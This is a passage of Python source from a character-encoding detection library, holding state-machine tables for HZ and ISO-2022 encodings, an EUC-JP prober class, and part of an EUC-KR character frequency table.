4,eItsMe,eStart,eStart,eStart,eStart,eStart,eStart,
)
HZCharLenTable = (0, 0, 0, 0, 0, 0)
HZSMModel = {'classTable': HZ_cls,
'classFactor': 6,
'stateTable': HZ_st,
'charLenTable': HZCharLenTable,
'name': "HZ-GB-2312"}
ISO2022CN_cls = (
2,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,1,0,0,0,0,
0,0,0,0,0,0,0,0,
0,3,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,4,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
)
ISO2022CN_st = (
eStart,     3,eError,eStart,eStart,eStart,eStart,eStart,
eStart,eError,eError,eError,eError,eError,eError,eError,
eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,
eItsMe,eItsMe,eItsMe,eError,eError,eError,     4,eError,
eError,eError,eError,eItsMe,eError,eError,eError,eError,
5,     6,eError,eError,eError,eError,eError,eError,
eError,eError,eError,eItsMe,eError,eError,eError,eError,
eError,eError,eError,eError,eError,eItsMe,eError,eStart,
)
ISO2022CNCharLenTable = (0, 0, 0, 0, 0, 0, 0, 0, 0)
ISO2022CNSMModel = {'classTable': ISO2022CN_cls,
'classFactor': 9,
'stateTable': ISO2022CN_st,
'charLenTable': ISO2022CNCharLenTable,
'name': "ISO-2022-CN"}
ISO2022JP_cls = (
2,0,0,0,0,0,0,0,
0,0,0,0,0,0,2,2,
0,0,0,0,0,0,0,0,
0,0,0,1,0,0,0,0,
0,0,0,0,7,0,0,0,
3,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
6,0,4,0,8,0,0,0,
0,9,5,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
)
ISO2022JP_st = (
eStart,     3,eError,eStart,eStart,eStart,eStart,eStart,
eStart,eStart,eError,eError,eError,eError,eError,eError,
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,
eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eError,eError,
eError,     5,eError,eError,eError,     4,eError,eError,
eError,eError,eError,     6,eItsMe,eError,eItsMe,eError,
eError,eError,eError,eError,eError,eError,eItsMe,eItsMe,
eError,eError,eError,eItsMe,eError,eError,eError,eError,
eError,eError,eError,eError,eItsMe,eError,eStart,eStart,
)
ISO2022JPCharLenTable = (0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
ISO2022JPSMModel = {'classTable': ISO2022JP_cls,
'classFactor': 10,
'stateTable': ISO2022JP_st,
'charLenTable': ISO2022JPCharLenTable,
'name': "ISO-2022-JP"}
ISO2022KR_cls = (
2,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,1,0,0,0,0,
0,0,0,0,3,0,0,0,
0,4,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,5,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
)
ISO2022KR_st = (
eStart,     3,eError,eStart,eStart,eStart,eError,eError,
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,
eItsMe,eItsMe,eError,eError,eError,     4,eError,eError,
eError,eError,eError,eError,     5,eError,eError,eError,
eError,eError,eError,eItsMe,eStart,eStart,eStart,eStart,
)
ISO2022KRCharLenTable = (0, 0, 0, 0, 0, 0)
ISO2022KRSMModel = {'classTable': ISO2022KR_cls,
'classFactor': 6,
'stateTable': ISO2022KR_st,
'charLenTable': ISO2022KRCharLenTable,
'name': "ISO-2022-KR"}
import sys
from . import constants
from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import EUCJPDistributionAnalysis
from .jpcntx import EUCJPContextAnalysis
from .mbcssm import EUCJPSMModel
class EUCJPProber(MultiByteCharSetProber):
def __init__(self):
MultiByteCharSetProber.__init__(self)
self._mCodingSM = CodingStateMachine(EUCJPSMModel)
self._mDistributionAnalyzer = EUCJPDistributionAnalysis()
self._mContextAnalyzer = EUCJPContextAnalysis()
self.reset()
def reset(self):
MultiByteCharSetProber.reset(self)
self._mContextAnalyzer.reset()
def get_charset_name(self):
return "EUC-JP"
def feed(self, aBuf):
aLen = len(aBuf)
for i in range(0, aLen):
codingState = self._mCodingSM.next_state(aBuf[i])
if codingState == constants.eError:
if constants._debug:
sys.stderr.write(self.get_charset_name()
+ ' prober hit error at byte ' + str(i)
+ '\n')
self._mState = constants.eNotMe
break
elif codingState == constants.eItsMe:
self._mState = constants.eFoundIt
break
elif codingState == constants.eStart:
charLen = self._mCodingSM.get_current_charlen()
if i == 0:
self._mLastChar[1] = aBuf[0]
self._mContextAnalyzer.feed(self._mLastChar, charLen)
self._mDistributionAnalyzer.feed(self._mLastChar, charLen)
else:
self._mContextAnalyzer.feed(aBuf[i - 1:i + 1], charLen)
self._mDistributionAnalyzer.feed(aBuf[i - 1:i + 1],
charLen)
self._mLastChar[0] = aBuf[aLen - 1]
if self.get_state() == constants.eDetecting:
if (self._mContextAnalyzer.got_enough_data() and
(self.get_confidence() > constants.SHORTCUT_THRESHOLD)):
self._mState = constants.eFoundIt
return self.get_state()
def get_confidence(self):
contxtCf = self._mContextAnalyzer.get_confidence()
distribCf = self._mDistributionAnalyzer.get_confidence()
return max(contxtCf, distribCf)
EUCKR_TYPICAL_DISTRIBUTION_RATIO = 6.0
EUCKR_TABLE_SIZE = 2352
EUCKRCharToFreqOrder = ( \
13, 130, 120,1396, 481,1719,1720, 328, 609, 212,1721, 707, 400, 299,1722,  87,
1397,1723, 104, 536,1117,1203,1724,1267, 685,1268, 508,1725,1726,1727,1728,1398,
1399,1729,1730,1731, 141, 621, 326,1057, 368,1732, 267, 488,  20,1733,1269,1734,
945,1400,1735,  47, 904,1270,1736,1737, 773, 248,1738, 409, 313, 786, 429,1739,
116, 987, 813,1401, 683,  75,1204, 145,1740,1741,1742,1743,  16, 847, 667, 622,
708,1744,1745,1746, 966, 787, 304, 129,1747,  60, 820, 123, 676,1748,1749,1750,
1751, 617,1752, 626,1753,1754,1755,1756, 653,1757,1758,1759,1760,1761,1762, 856,
344,1763,1764,1765,1766,  89, 401, 418, 806, 905, 848,1767,1768,1769, 946,1205,
709,1770,1118,1771, 241,1772,1773,1774,1271,1775, 569,1776, 999,1777,1778,1779,
1780, 337, 751,1058,  28, 628, 254,1781, 177, 906, 270, 349, 891,1079,1782,  19,
1783, 379,1784, 315,1785, 629, 754,1402, 559,1786, 636, 203,1206,1787, 710, 567,
1788, 935, 814,1789,1790,1207, 766, 528,1791,1792,1208,1793,1794,1795,1796,1797,
1403,1798,1799, 533,1059,1404,1405,1156,1406, 936, 884,1080,1800, 351,1801,1802,
1803,1804,1805, 801,1806,1807,1808,1119,1809,1157, 714, 474,1407,1810, 298, 899,
885,1811,1120, 802,1158,1812, 892,1813,1814,1408, 659,1815,1816,1121,1817,1818,
1819,1820,1821,1822, 319,1823, 594, 545,1824, 815, 937,1209,1825,1826, 573,1409,
1022,1827,1210,1828,1829,1830,1831,1832,1833, 556, 722, 807,1122,1060,1834, 697,
1835, 900, 557, 715,1836,1410, 540,1411, 752,1159, 294, 597,1211, 976, 803, 770,
1412,1837,1838,  39, 794,1413, 358,1839, 371, 925,1840, 453, 661, 788, 531, 723,
544,1023,1081, 869,  91,1841, 392, 430, 790, 602,1414, 677,1082, 457,1415,1416,
1842,1843, 475, 327,1024,1417, 795, 121,1844, 733, 403,1418,1845,1846,1847, 300,
119, 711,1212, 627,1848,1272, 207,1849,1850, 796,1213, 382,1851, 519,1852,1083,
893,1853,1854,1855, 367, 809, 487, 671,1856, 663,1857,1858, 956, 471, 306, 857,
1859,1860,1160,1084,1861,1862,1863,1864,1865,1061,1866,1867,1868,1869,1870,1871,
282,  96, 574,1872, 502,1085,1873,1214,1874, 907,1875,1876, 827, 977,1419,1420,
1421, 268,1877,1422,1878,1879,1880, 308,1881,   2, 537,1882,1883,1215,1884,1885,
127, 791,1886,1273,1423,1887,  34, 336, 404, 643,1888, 571, 654, 894, 840,1889,
0, 886,1274, 122, 575, 260, 908, 938,1890,1275, 410, 316,1891,1892, 100,1893,
1894,1123,  48,1161,1124,1025,1895, 633, 901,1276,1896,1897, 115, 816,1898, 317,
1899, 694,1900, 909, 734,1424, 572, 866,1425, 691,  85, 524,1010, 543, 394, 841,
1901,1902,1903,1026,1904,1905,1906,1907,1908,1909,  30, 451, 651, 988, 310,1910,
1911,1426, 810,1216,  93,1912,1913,1277,1217,1914, 858, 759,  45,  58, 181, 610,
269,1915,1916, 131,1062, 551, 443,1000, 821,1427, 957, 895,1086,1917,1918, 375,
1919, 359,1920, 687,1921, 822,1922, 293,1923,1924,  40, 662, 118, 692,  29, 939,
887, 640, 482, 174,1925,  69,1162, 728,1428, 910,1926,1278,1218,1279, 386, 870,
217, 854,1163, 823,1927,1928,1929,1930, 834,1931,  78,1932, 859,1933,1063,1934,
1935,1936,1937, 438,1164, 208, 595,1938,1939,1940,1941,1219,1125,1942, 280, 888,
1429,1430,1220,1431,1943,1944,1945,1946,1947,1280, 150, 510,1432,1948,1949,1950,
1951,1952,1953,1954,1011,1087,1955,1433,1043,1956, 881,1957, 614, 958,1064,1065,
1221,1958, 638,1001, 860, 967, 896,1434, 989, 492, 553,1281,1165,1959,1282,1002,
1283,1222,1960,1961,1962,1963,  36, 383, 228, 753, 247, 454,1964, 876, 678,1965,
1966,1284, 126, 464, 490, 835, 136, 672, 529, 940,1088,1435, 473,1967,1968, 467,
50, 390, 227, 587, 279, 378, 598, 792, 968, 240, 151, 160, 849, 882,1126,1285,
639,1044, 133, 140, 288, 360, 811, 563,1027, 561, 142, 523,1969,1970,1971,   7,
103, 296, 439, 407, 506, 634, 990,1972,1973,1974,1975, 645,1976,1977,1978,1979,
1980,1981, 236,1982,1436,1983,1984,1089, 192, 828, 618, 518,1166, 333,1127,1985,
818,1223,1986,1987,1988,1989,1990,1991,1992,1993, 342,1128,1286, 746, 842,1994,
1995, 560, 223,1287,  98,   8, 189, 650, 978,1288,1996,1437,1997,  17, 345, 250,
423, 277, 234, 512, 226,  97, 289,  42, 167,1998, 201,1999,2000, 843, 836, 824,
532, 338, 783,1090, 182, 576, 436,1438,1439, 527, 500,2001, 947, 889,2002,2003,
2004,2005, 262, 600, 314, 447,2006, 547,2007, 693, 738,1129,2008,  71,1440, 745,
619, 688,2009, 829,2010,2011, 147,2012,  33, 948,2013,2014,  74, 224,2015,  61,
191, 918, 399, 637,2016,1028,1130, 257, 902,2017,2018,2019,2020,2021,2022,2023,
2024,2025,2026, 837,2027,2028,2029,2030, 179, 874, 591,  52, 724, 246,2031,2032,
2033,2034,1167, 969,2035,1289, 630, 605, 911,1091,1168,2036,2037,2038,1441, 912,
2039, 623,2040,2041, 253,1169,1290,2042,1442, 146, 620, 611, 577, 433,2043,1224,
719,1170, 959, 440, 437, 534,  84, 388, 480,1131, 159, 220, 198, 679,2044,1012,
819,1066,1443, 113,1225, 194, 318,1003,1029,2045,2046,2047,2048,1067,2049,2050,
2051,2052,2053,  59, 913, 112,2054, 632,2055, 455, 144, 739,1291,2056, 273, 681,
499,2057, 448,2058,2059, 760,2060,2061, 970, 384, 169, 245,1132,2062,2063, 414,
1444,2064,2065,  41, 235,2066, 157, 252, 877, 568, 919, 789, 580,2067, 725,2068,
2069,1292,2070,2071,1445,2072,1446,2073,2074,  55, 588,  66,1447, 271,1092,2075,
1226,2076, 960,1013, 372,2077,2078,2079,2080,2081,1293,2082,2083,2084,2085, 850,
2086,2087,2088,2089,2090, 186,2091,1068, 180,2092,2093,2094, 109,1227, 522, 606,
2095, 867,1448,1093, 991,1171, 926, 353,1133,2096, 581,2097,2098,2099,1294,1449,
1450,2100, 596,1172,1014,1228,2101,1451,1295,1173,1229,2102,2103,1296,1134,1452,
949,1135,2104,2105,1094,1453,1454,1455,2106,1095,2107,2108,2109,2110,2111,2112,
2113,2114,2115,2116,2117, 804,2118,2119,1230,1231, 805,1456, 405,1136,2120,2121,
2122,2123,2124, 720, 701,1297, 992,1457, 927,1004,2125,2126,2127,2128,2129,2130,
22, 417,2131, 303,2132, 385,2133, 971, 520, 513,2134,1174,  73,1096, 231, 274,
962,1458, 673,2135,1459,2136, 152,1137,2137,2138,2139,2140,1005,1138,1460,1139,
2141,2142,2143,2144,  11, 374, 844,2145, 154,1232,  46,1461,2146, 838, 830, 721,
1233, 106,2147,  90, 428, 462, 578, 566,1175, 352,2148,2149, 538,1234, 124,1298,
2150,1462, 761, 565,2151, 686,2152, 649,2153,  72, 173,2154, 460, 415,2155,1463,
2156,1235, 305,2157,2158,2159,2160,2161,2162, 579,2163,2164,2165,2166,2167, 747,
2168,2169,2170,2171,1464, 669,2172,2173,2174,2175,2176,1465,2177,  23, 530, 285,
2178, 335, 729,2179, 397,2180,2181,2182,1030,2183,2184, 698,2185,2186, 325,2187,
2188, 369,2189, 799,1097,1015, 348,2190,1069, 680,2191, 851,1466,2192,2193,  10,
2194, 613, 424,2195, 979, 108, 449, 589,  27, 172,  81,1031,  80, 774, 281, 350,
1032, 525, 301, 582,1176,2196, 674,1045,2197,2198,1467, 730, 762,2199,2200,2201,
2202,1468,2203, 993,2204,2205, 266,1070, 963,1140,2206,2207,2208, 664,1098, 972,
2209,2210,2211,1177,1469,1470, 871,2212,2213,2214,2215,2216,1471,2217,2218,2219,
2220,2221,2222,2223,2224,2225,2226,2227,1472,1236,2228,2229,2230,2231,2232,2233,
2234,2235,1299,2236,2237, 200,2238, 477, 373,2239,2240, 731, 825, 777,2241,2242,
2243, 521, 486, 548,2244,2245,2246,1473,1300,  53, 549, 137, 875,  76, 158,2247,
1301,1474, 469, 396,1016, 278, 712,2248, 321, 442, 503, 767, 744, 941,1237,1178,
1475,2249,  82, 178,1141,1179, 973,2250,1302,2251, 297,2252,2253, 570,2254,2255,
2256,  18, 450, 206,2257, 290, 292,1142,2258, 511, 162,  99, 346, 164, 735,2259,
1476,1477,   4, 554, 343, 798,1099,2260,1100,2261,  43, 171,1303, 139, 215,2262,
2263, 717, 775,2264,1033, 322, 216,2265, 831,2266, 149,2267,1304,2268,2269, 702,
1238, 135, 845, 347, 309,2270, 484,2271, 878, 655, 238,1006,1478,2272,  67,2273,
295,2274,2275, 461,2276, 478, 942, 412,2277,1034,2278,2279,2280, 265,2281, 541,
2282,2283,2284,2285,2286,  70, 852,1071,2287,2288,2289,2290,  21,  56, 509, 117,
432,2291,2292, 331, 980, 552,1101, 148, 284, 105, 393,1180,1239, 755,2293, 187,
2294,1046,1479,2295, 340,2296,  63,1047, 230,2297,2298,1305, 763,1306, 101, 800,
808, 494,2299,2300,2301, 903,2302,  37,1072,  14,   5,2303,  79, 675,2304, 312,
2305,2306,2307,2308,2309,1480,   6,1307,2310,2311,2312,   1, 470,  35,  24, 229,
2313, 695, 210,  86, 778,  15, 784, 592, 779,  32,  77, 855, 964,2314, 259,2315,
501, 380,2316,2317,  83, 981, 153, 689,1308,1481,1482,1483,2318,2319, 716,1484,
2320,2321,2322,2323,2324,2325,1485,2326,2327, 128,  57,  68, 261,1048, 211, 170,
1240,  31,2328,  51, 435, 742,2329,2330,2331, 635,2332, 264, 456,2333,2334,2335,
425,2336,1486, 143, 507, 263, 943,2337, 363, 920,1487, 256,1488,1102, 243, 601,
1489,2338,2339,2340,2341,2342,2343,2344, 861,2345,2346,2347,2348,2349,2350, 395,
2351,1490,1491,  62, 535, 166, 225,2352,2353, 668, 419,1241, 138, 604, 928,2354,
1181,2355,1492,1493,2356,2357,2358,1143,2359, 696,2360, 387, 307,1309, 682, 476,
2361,2362, 332,  12, 222, 156,2363, 232,2364, 641, 276, 656, 517,1494,1495,1035,
416, 736,1496,2365,1017, 586,2366,2367,2368,1497,2369, 242,2370,2371,2372,1498,
2373, 965, 713,2374,2375,2376,2377, 740, 982,1499, 944,1500,1007,2378,2379,1310,
1501,2380,2381,2382, 785, 329,2383,2384,1502,2385,2386,2387, 932,2388,1503,2389,
2390,2391,2392,1242,2393,2394,2395,2396,2397, 994, 950,2398,2399,2400,2401,1504,
1311,2402,2403,2404,2405,1049, 749,2406,2407, 853, 718,1144,1312,2408,1182,1505,
2409,2410, 255, 516, 479, 564, 550, 214,1506,1507,1313, 413, 239, 444, 339,1145,
1036,1508,1509,1314,1037,1510,1315,2411,1511,2412,2413,2414, 176, 703, 497, 624,
593, 921, 302,2415, 341, 165,1103,1512,2416,1513,2417,2418,2419, 376,2420, 700,
2421,2422,2423, 258, 768,1316,2424,1183,2425, 995, 608,2426,2427,2428,2429, 221,
2430,2431,2432,2433,2434,2435,2436,2437, 195, 323, 726, 188, 897, 983,1317, 377,
644,1050, 879,2438, 452,2439,2440,2441,2442,2443,2444, 914,2445,2446,2447,2448,
915, 489,2449,1514,1184,2450,2451, 515,  64, 427, 495,2452, 583,2453, 483, 485,
1038, 562, 213,1515, 748, 666,2454,2455,2456,2457, 334,2458, 780, 996,1008, 705,
1243,2459,2460,2461,2462,2463, 114,2464, 493,1146, 366, 163,1516, 961,1104,2465,
291,2466,1318,1105,2467,1517, 365,2468, 355, 951,1244,2469,1319,2470, 631,2471,
2472, 218,1320, 364, 320, 756,1518,1519,1321,1520,1322,2473,2474,2475,2476, 997,
2477,2478,2479,2480, 665,1185,2481, 916,1521,2482,2483,2484, 584, 684,2485,2486,
797,2487,1051,1186,2488,2489,2490,1522,2491,2492, 370,2493,1039,1187,  65,2494,
434, 205, 463,1188,2495, 125, 812, 391, 402, 826, 699, 286, 398, 155, 781, 771,
585,2496, 590, 505,1073,2497, 599, 244, 219, 917,1018, 952, 646,1523,2498,1323,
2499,2500,  49, 984, 354, 741,2501, 625,2502,1324,2503,1019, 190, 357, 757, 491,
95, 782, 868,2504,2505,2506,2507,2508,2509, 134,1524,1074, 422,1525, 898,2510,
161,2511,2512,2513,2514, 769,2515,1526,2516,2517, 411,1325,2518, 472,1527,2519,
2520,2521,2522,2523,2524, 985,2525,2526,2527,2528,2529,2530, 764,2531,1245,2532,
2533,  25, 204, 311,2534, 496,2535,1052,2536,2537,2538,2539,2540,2541,2542, 199,
704, 504, 468, 758, 657,1528, 196,  44, 839,1246, 272, 750,2543, 765, 862,2544,
2545,1326,2546, 132, 615, 933,2547, 732,2548,2549,2550,1189,1529,2551, 283,1247,
1053, 607, 929,2552,2553,2554, 930, 183, 872, 616,1040,1147,2555,1148,1020, 441,
249,1075,2556,2557,2558, 466, 743,2559,2560,2561,  92, 514, 426, 420, 526,2562,
2563,2564,2565,2566,2567,2568, 185,2569,2570,2571,2572, 776,1530, 658,2573, 362,
2574, 361, 922,1076, 793,2575,2576,2577,2578,2579,2580,1531, 251,2581,2582,2583,
2584,1532,  54, 612, 237,1327,2585,2586, 275, 408, 647, 111,2587,1533,1106, 465,
3, 458,   9,  38,2588, 107, 110, 890, 209,  26, 737, 498,2589,1534,2590, 431,
202,  88,1535, 356, 287,1107, 660,1149,2591, 381,1536, 986,1150, 445,1248,1151,
974,2592,2593, 846,2594, 446, 953, 184,1249,1250, 727,2595, 923, 193, 883,2596,
2597,2598, 102, 324, 539, 817,2599, 421,1041,2600, 832,2601,  94, 175, 197, 406,
2602, 459,2603,2604,2605,2606,2607, 330, 555,2608,2609,2610, 706,1108, 389,2611,
2612,2613,2614, 233,2615, 833, 558, 931, 954,1251,2616,2617,1537, 546,2618,2619,
1009,2620,2621,2622,1538, 690,1328,2623, 955,2624,1539,2625,2626, 772,2627,2628,
2629,2630,2631, 924, 648, 863, 603,2632,2633, 934,1540, 864, 865,2634, 642,1042,
670,1190,2635,2636,2637,2638, 168,2639, 652, 873, 542,1054,1541,2640,2641,2642,
2643,2644,2645,2646,2647,2648,2649,2650,2651,2652,2653,2654,2655,2656,2657,2658,
2659,2660,2661,2662,2663,2664,2665,2666,2667,2668,2669,2670,2671,2672,2673,2674,
2675,2676,2677,2678,2679,2680,2681,2682,2683,2684,2685,2686,2687,2688,2689,2690,
2691,2692,2693,2694,2695,2696,2697,2698,2699,1542, 880,2700,2701,2702,2703,2704,
2705,2706,2707,2708,2709,2710,2711,2712,2713,2714,2715,2716,2717,2718,2719,2720,
2721,2722,2723,2724,2725,1543,2726,2727,2728,2729,2730,2731,2732,1544,2733,2734,
2735,2736,2737,2738,2739,2740,2741,2742,2743,2744,2745,2746,2747,2748,2749,2750,
2751,2752,2753,2754,1545,2755,2756,2757,2758,2759,2760,2761,2762,2763,2764,2765,
2766,1546,2767,1547,2768,2769,2770,2771,2772,2773,2774,2775,2776,2777,2778,2779,
2780,2781,2782,2783,2784,2785,2786,1548,2787,2788,2789,1109,2790,2791,2792,2793,
2794,2795,2796,2797,2798,2799,2800,2801,2802,2803,2804,2805,2806,2807,2808,2809,
2810,2811,2812,1329,2813,2814,2815,2816,2817,2818,2819,2820,2821,2822,2823,2824,
2825,2826,2827,2828,2829,2830,2831,2832,2833,2834,2835,2836,2837,2838,2839,2840,
2841,2842,2843,2844,2845,2846,2847,2848,2849,2850,2851,2852,2853,2854,2855,2856,
1549,2857,2858,2859,2860,1550,2861,2862,1551,2863,2864,2865,2866,2867,2868,2869,
2870,2871,2872,2873,2874,1110,1330,2875,2876,2877,2878,2879,2880,2881,2882,2883,
2884,2885,2886,2887,2888,2889,2890,2891,2892,2893,2894,2895,2896,2897,2898,2899,
2900,2901,2902,2903,2904,2905,2906,2907,2908,2909,2910,2911,2912,2913,2914,2915,
2916,2917,2918,2919,2920,2921,2922,2923,2924,2925,2926,2927,2928,2929,2930,1331,
2931,2932,2933,2934,2935,2936,2937,2938,2939,2940,2941,2942,2943,1552,2944,2945,
2946,2947,2948,2949,2950,2951,2952,2953,2954,2955,2956,2957,2958,2959,2960,2961,
2962,2963,2964,1252,2965,2966,2967,2968,2969,2970,2971,2972,2973,2974,2975,2976,
2977,2978,2979,2980,2981,2982,2983,2984,2985,2986,2987,2988,2989,2990,2991,2992,
2993,2994,2995,2996,2997,2998,2999,3000,3001,3002,3003,3004,3005,3006,3007,3008,
3009,3010,3011,3012,1553,3013,3014,3015,3016,3017,1554,3018,1332,3019,3020,3021,
3022,3023,3024,3025,3026,3027,3028,3029,3030,3031,3032,3033,3034,3035,3036,3037,
3038,3039,3040,3041,3042,3043,3044,3045,3046,3047,3048,3049,3050,1555,3051,3052,
3053,1556,1557,3054,3055,3056,3057,3058,3059,3060,3061,3062,3063,3064,3065,3066,
3067,1558,3068,3069,3070,3071,3072,3073,3074,3075,3076,1559,3077,3078,3079,3080,
3081,3082,3083,1253,3084,3085,3086,3087,3088,3089,3090,3091,3092,3093,3094,3095,
3096,3097,3098,3099,3100,3101,3102,3103,3104,3105,3106,3107,3108,1152,3109,3110,
3111,3112,3113,1560,3114,3115,3116,3117,1111,3118,3119,3120,3121,3122,3123,3124,
3125,3126,3127,3128,3129,3130,3131,3132,3133,3134,3135,3136,3137,3138,3139,3140,
3141,3142,3143,3144,3145,3146,3147,3148,3149,3150,3151,3152,3153,3154,3155,3156,
3157,3158,3159,3160,3161,3162,3163,3164,3165,3166,3167,3168,3169,3170,3171,3172,
3173,3174,3175,3176,1333,3177,3178,3179,3180,3181,3182,3183,3184,3185,3186,3187,
3188,3189,1561,3190,3191,1334,3192,3193,3194,3195,3196,3197,3198,3199,3200,3201,
3202,3203,3204,3205,3206,3207,3208,3209,3210,3211,3212,3213,3214,3215,3216,3217,
3218,3219,3220,3221,3222,3223,3224,3225,3226,3227,3228,3229,3230,3231,3232,3233,
3234,1562,3235,3236,3237,3238,3239,3240,3241,3242,3243,3244,3245,3246,3247,3248,
3249,3250,3251,3252,3253,3254,3255,3256,3257,3258,3259,3260,3261,3262,3263,3264,
3265,3266,3267,3268,3269,3270,3271,3272,3273,3274,3275,3276,3277,1563,3278,3279,
3280,3281,3282,3283,3284,3285,3286,3287,3288,3289,3290,3291,3292,3293,3294,3295,
3296,3297,3298,3299,3300,3301,3302,3303,3304,3305,3306,3307,3308,3309,3310,3311,
3312,3313,3314,3315,3316,3317,3318,3319,3320,3321,3322,3323,3324,3325,3326,3327,
3328,3329,3330,3331,3332,3333,3334,3335,3336,3337,3338,3339,3340,3341,3342,3343,
3344,3345,3346,3347,3348,3349,3350,3351,3352,3353,3354,3355,3356,3357,3358,3359,
3360,3361,3362,3363,3364,1335,3365,3366,3367,3368,3369,3370,3371,3372,3373,3374,
3375,3376,3377,3378,3379,3380,3381,3382,3383,3384,3385,3386,3387,1336,3388,3389,
3390,3391,3392,3393,3394,3395,3396,3397,3398,3399,3400,3401,3402,3403,3404,3405,
3406,3407,3408,3409,3410,3411,3412,3413,3414,1337,3415,3416,3417,3418,3419,1338,
3420,3421,3422,1564,1565,3423,3424,3425,3426,3427,3428,3429,3430,3431,1254,3432,
3433,3434,1339,3435,3436,3437,3438,3439,1566,3440,3441,3442,3443,3444,3445,3446,
3447,3448,3449,3450,3451,3452,3453,3454,1255,3455,3456,3457,3458,3459,1567,1191,
3460,1568,1569,3461,3462,3463,1570,3464,3465,3466,3467,3468,1571,3469,3470,3471,
3472,3473,1572,3474,3475,3476,3477,3478,3479,3480,3481,3482,3483,3484,3485,3486,
1340,3487,3488,3489,3490,3491,3492,1021,3493,3494,3495,3496,3497,3498,1573,3499,
1341,3500,3501,3502,3503,3504,3505,3506,3507,3508,3509,3510,3511,1342,3512,3513,
3514,3515,3516,1574,1343,3517,3518,3519,1575,3520,1576,3521,3522,3523,3524,3525,
3526,3527,3528,3529,3530,3531,3532,3533,3534,3535,3536,3537,3538,3539,3540,3541,
3542,3543,3544,3545,3546,3547,3548,3549,3550,3551,3552,3553,3554,3555,3556,3557,
3558,3559,3560,3561,3562,3563,3564,3565,3566,3567,3568,3569,3570,3571,3572,3573,
3574,3575,3576,3577,3578,3579,3580,1577,3581,3582,1578,3583,3584,3585,3586,3587,
3588,3589,3590,3591,3592,3593,3594,3595,3596,3597,3598,3599,3600,3601,3602,3603,
3604,1579,3605,3606,3607,3608,3609,3610,3611,3612,3613,3614,3615,3616,3617,3618,
3619,3620,3621,3622,3623,3624,3625,3626,3627,3628,3629,1580,3630,3631,1581,3632,
3633,3634,3635,3636,3637,3638,3639,3640,3641,3642,3643,3644,3645,3646,3647,3648,
3649,3650,3651,3652,3653,3654,3655,3656,1582,3657,3658,3659,3660,3661,3662,3663,
3664,3665,3666,3667,3668,3669,3670,3671,3672,3673,3674,3675,3676,3677,3678,3679,
3680,3681,3682,3683,3684,3685,3686,3687,3688,3689,3690,3691,3692,3693,3694,3695,
3696,3697,3698,3699,3700,1192,3701,3702,3703,3704,1256,3705,3706,3707,3708,1583,
1257,3709,3710,3711,3712,3713,3714,3715,3716,1584,3717,3718,3719,3720,3721,3722,
3723,3724,3725,3726,3727,3728,3729,3730,3731,3732,3733,3734,3735,3736,3737,3738,
3739,3740,3741,3742,3743,3744,3745,1344,3746,3747,3748,3749,3750,3751,3752,3753,
3754,3755,3756,1585,3757,3758,3759,3760,3761,3762,3763,3764,3765,3766,1586,3767,
3768,3769,3770,3771,3772,3773,3774,3775,3776,3777,3778,1345,3779,3780,3781,3782,
3783,3784,3785,3786,3787,3788,3789,3790,3791,3792,3793,3794,3795,1346,1587,3796,
3797,1588,3798,3799,3800,3801,3802,3803,3804,3805,3806,1347,3807,3808,3809,3810,
3811,1589,3812,3813,3814,3815,3816,3817,3818,3819,3820,3821,1590,3822,3823,1591,
1348,3824,3825,3826,3827,3828,3829,3830,1592,3831,3832,1593,3833,3834,3835,3836,
